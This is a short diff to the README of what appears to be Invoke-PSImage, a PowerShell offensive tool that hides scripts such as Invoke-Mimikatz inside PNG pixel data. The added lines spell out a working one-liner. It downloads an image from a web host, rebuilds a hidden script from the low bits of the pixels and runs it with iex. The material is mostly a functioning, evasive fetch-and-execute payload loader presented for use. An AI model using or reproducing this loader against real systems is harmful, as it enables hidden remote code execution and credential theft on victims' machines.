@@ -35,5 +35,20 @@ PS>Import-Module .\Invoke-PSImage.ps1
 PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Image .\kiwi.jpg -Out .\evil-kiwi.png -Web
    [Oneliner to execute from the web]
 ``` 
+Onliner broken down from the image below
+```
+sal a New-Object
+
+Add-Type -AssemblyName "System.Drawing";
+
+$g = a System.Drawing.Bitmap((a Net.WebClient).OpenRead("https://i.imgur.com/<your.png>"));
+
+$o = a Byte[] 2204160;(0..1147)|% {foreach($x in (0..1919)){$p = $g.GetPixel($x,$_);
+
+$o[$_*1920+$x]=([math]::Floor(($p.B -band 15)*16) -bor ($p.G -band 15)))}};
+
+$g.Dispose();iex([System.Text.Encoding]::ASCII.GetString($o[0..2204115])); # invoke your function
+
+```
 Executing an image hosted on the web:
 ![Screenshot of using Invoke-PSImage](https://github.com/peewpw/Invoke-PSImage/raw/master/images/ps_kiwi.png)
